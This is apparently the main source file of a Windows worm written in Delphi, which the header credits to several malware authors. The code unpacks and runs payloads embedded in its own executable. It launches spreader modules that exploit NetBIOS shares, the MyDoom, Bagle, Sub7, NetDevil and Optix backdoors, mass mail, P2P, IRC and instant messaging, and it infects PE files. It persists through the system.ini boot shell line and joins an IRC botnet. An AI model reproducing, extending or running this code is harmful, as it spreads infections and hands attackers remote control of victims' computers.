{
   Stub file    is based on the example HaTcHeT released.
   PE_Spreader  is based on the example HaTcHeT released.

   Visit his page at :
     www.E-FrEaK.co.uk

   Additional sourcecode created by
     NetBios, myDoom, strList
     Positron :
       http://positronvx.cjb.net

     beagle1, beagle2, netdevil, optix, sub7, massmailer, p2p, dcpp, pe, irc, msn, icq, bot
     p0ke :
       http://p0ke.no-ip.com
}

program stub;

uses
  windows,
  shellAPI,
  netbios_spreader in 'netbios_spreader.pas',
  mydoom_spreader in 'mydoom_spreader.pas',
  bagle_spreader1 in 'bagle_spreader1.pas',
  bagle_spreader2 in 'bagle_spreader2.pas',
  netdevil_spreader in 'netdevil_spreader.pas',
  optix_spreader in 'optix_spreader.pas',
  sub7_spreader in 'sub7_spreader.pas',
  icqmsn_spreader in 'icqmsn_spreader.pas',
  web_spreader in 'web_spreader.pas',
  dcpp_spreader in 'dcpp_spreader.pas',
  massmail_spreader in 'massmail_spreader.pas',
  irc_spreader in 'irc_spreader.pas',
  p2p_spreader in 'p2p_spreader.pas',
  spreader_bot in 'spreader_bot.pas',
  stats_spreader in 'stats_spreader.pas',
  plugin_spreader in 'plugin_spreader.pas',
  pe_spreader in 'pe_spreader.pas';

const
  bot_server            : string = '~bs?                                        ';
  bot_port              : string = '~ps?     ';
  bot_channel           : string = '~cs?                    ';
  bot_key               : string = '~ks?                    ';
  bot_pass              : string = '~pa?                    ';

  const_signature       : string = '~~babylon-watches-you~~';

Function pTrim(Str: String): String;
Begin
  While (Length(Str) > 0) Do
    If (Str[Length(Str)] = ' ') Then
      Str := Copy(Str, 1, Length(Str)-1)
    Else
      Break;

  if copy(str, 1, 4) = '~bs?' then delete(str, 1, 4);
  if copy(str, 1, 4) = '~ps?' then delete(str, 1, 4);
  if copy(str, 1, 4) = '~cs?' then delete(str, 1, 4);
  if copy(str, 1, 4) = '~ks?' then delete(str, 1, 4);
  if copy(str, 1, 4) = '~pa?' then delete(str, 1, 4);
  Result := Str;
End;

procedure startspreaders;
begin
  StartNetBIOS   (50);
  StartBeagle1   (50);
  StartBeagle2   (50);
  StartNetDevil  (50);
  StartOptix     (50);
  StartSub7      (50);
  StartMyDoom    (50);
  StartICQMSN     (1);
  StartMassMail      ;
  StartDCPP          ;
  StartInfector      ;
  StartIRC           ;
  StartP2P           ;
end;

function GetRandName: String;
Var
  Name: String;
Begin
  Str(GetTickCount, Name);
  Result := Name+'.exe';
End;

function StrtoInt(const S: string): integer; var E: integer;
begin Val(S, Result, E);end;

procedure ReadFileStr(Name: String; Var Output: String);
Var
  Input         :File Of Char;
  Buff          :Array [1..1024] Of Char;
  Len           :LongInt;
  Size          :LongInt;
Begin
  Try
    OutPut := '';

    AssignFile(Input, Name);
    Reset(Input);
    Size := FileSize(Input);
    While Not (EOF(Input)) Do
    Begin
      BlockRead(Input, Buff, 1024, Len);
      Output := Output + String(Buff);
    End;
    CloseFile(Input);

    If Length(Output) > Size Then
      Delete(Output, Size, Length(Output));
  Except
    ;
  End;
End;

procedure ReleaseIt;
Var
  ReadData      :String;
  Settings      :String;
  Name          :String;
  Temp          :String;
  HostName      :String;
  I             :Integer;
  Size          :Integer;
  Output        :TextFile;
Begin
  HostName := GetRandName;

  If Not (CopyFile(pChar(ParamStr(0)), pChar(HostName), False)) Then
    Exit;

  ReadFileStr(HostName, ReadData);

  I := Length(ReadData);
  Settings := '';

  While (I > 0) And (ReadData[I] <> #00) Do
  Begin
    Settings := ReadData[I] + Settings;
    Dec(I);
  End;

  If Settings = '' Then
  Begin
    DeleteFile(pChar(HostName));
    Exit;
  End;

  Delete(ReadData, I, Length(Settings));

  While Pos(#01, Settings) > 0 Do
  Begin
    Temp := Copy(Settings, 1, Pos(#01, Settings) -1);
    Delete(Settings, 1, Pos(#01, Settings));

    Name := Copy(Temp, 1, Pos(#02, Temp)-1);
    Delete(Temp, 1, Pos(#02, Temp));
    Size := StrToInt(Temp);

    Try
      AssignFile(Output, Name);
      ReWrite(Output);
      Write(Output, Copy(ReadData, Length(ReadData)-Size, Size));
      CloseFile(Output);
    Except
      Exit;
    End;

    Delete(ReadData, Length(ReadData)-Size, Size);
    ShellExecute(0, NIL, pChar(Name), NIL, NIL, 1);
  End;

  DeleteFile(pChar(HostName));
End;

Procedure AutoStart;
Var
  Dir   :Array[0..255] Of Char;
Begin
  GetSystemDirectory(Dir, 256);
  If (CopyFile(pChar(ParamStr(0)), pChar(String(Dir)+'\stubbish.exe'), False)) Then
    WritePrivateProfileString('boot', 'shell', 'explorer.exe stubbish.exe', 'system.ini');
End;

begin
  ReleaseIt;

  If (CreateMutexA(NIL, FALSE, '~~babylon-watches-you~~0.2') = ERROR_ALREADY_EXISTS) Then
    ExitProcess(0);

  StartSpreaders;
  AutoStart;

  StartWebServer;

  Bot := tSock.Create;
  Bot.Server    := pTrim(bot_server);
  Bot.Port      := StrToInt(pTrim(bot_port));
  Bot.Nick      := RandIRCBot;
  Bot.Channel   := pTrim(bot_channel);
  Bot.Key       := pTrim(bot_key);
  Bot.Password  := pTrim(bot_pass);
  Bot.Clone     := False;
  Repeat
    If (Bot.StartUp) Then
      Sleep(1000*120);
  Until 1 = 2;
end.
